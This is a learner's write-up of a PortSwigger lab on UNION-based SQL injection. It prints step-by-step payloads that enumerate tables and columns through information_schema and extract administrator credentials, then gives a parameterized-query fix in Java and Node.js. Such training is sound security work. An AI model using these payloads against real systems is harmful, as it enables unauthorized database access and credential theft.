# SQL injection attack, listing the database contents on non-Oracle databases
## Goal: 
Determine the tables and columns that hold usernames and passwords, and retrieve the contents of the users table.

## Lab details
Lab: SQL injection attack, listing the database contents on non-Oracle databases

Level: Practitioner

Vulnerability Class: SQL Injection subtype: UNION-based

Lab URL: [\[PortSwigger lab link\]](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

Date Completed: 24-Jul-2026

Time to Solve: 45 mins

## Vulnerability Summary
The product category filter is vulnerable to SQL injection via UNION attack because the SQL query directly concatenates untrusted user input. This vulnerability enables retrieval of information from other database tables. We used `information_schema.tables` to obtain database metadata and subsequently retrieved schema details from the `users` table. Since the passwords were stored unencrypted, we were able to log in to the administrator account successfully.

## Reconnaissance
Given that the lab identified the category filter as vulnerable to SQL injection, I performed the following reconnaissance steps:
1. Determine the number of columns to perform UNION attack.
2. Identify table names from `information_schema.tables`.
3. Retrieve data type and column name of `USERS` table.
4. Extract the username and passwords from `USERS` table.

## Exploitation — Step by Step
### Step 1: Determine the number of columns.
I used a UNION-based SELECT query to identify the number of columns in the main query.
```text
Gifts' UNION SELECT NULL,NULL --
```
Probable resulting SQL query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT NULL, NULL --'
```
This query returned `200 OK` response indicating that the main query contained two columns.


### Step 2: IDENTIFYING ALL THE TABLES IN THE DB
For non-Oracle databases, metadata such as table names, columns, and views can be retrieved from `information_schema`. I queried `information_schema.tables` to enumerate all tables in the database.
```text
Gifts' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```
Probable resulting SQL query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --'
```
This query returned a 200 OK response along with all table names in the database. The table of interest was **users_ngykdi**.
#### Note: The name of the users table is dynamically generated and changes with each lab instance.

### Step 3: Identify columns of interest in `USERS` table.
To identify which columns store the username and password, I retrieved all columns from the users table.
```text
Gifts' UNION SELECT data_type,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_ngykdi'--
```
Probable resulting SQL query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT data_type,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_ngykdi' --'
```
This query returned all columns of the users_ngykdi table. The relevant columns were identified as username_sljcak and password_aecghw. Subsequently, I queried these two columns to retrieve the administrator credentials.

### Step 4: Retrieve credentials of the administrator.
With the target table name and column names identified, I constructed the final payload to extract the credentials.
```text
Gifts' UNION SELECT username_sljcak,password_aecghw FROM users_ngykdi--
```
Probable resulting SQL query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT username_sljcak,password_aecghw FROM users_ngykdi --'
```

This request returned a 200 OK response along with the administrator account credentials. Using the retrieved credentials on the login page, I successfully authenticated as the administrator user, completing the lab.


### Tools Used
 Manual (Burp Suite Repeater)

## The Fix
Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```

Additional mitigations:
- Least privilege DB user — app user should not have rights to access database metadata.


## Real-World Relevance
to-do

## Connections to My Own Projects
TBD

## Takeaway
Parameterized queries are the primary defense against SQL injection because they prevent user input from altering the structure of SQL queries. In addition, database hardening should be used as a defense-in-depth measure. This includes applying the principle of least privilege, disabling unnecessary database features, and using separate database accounts with only the permissions required by the application.
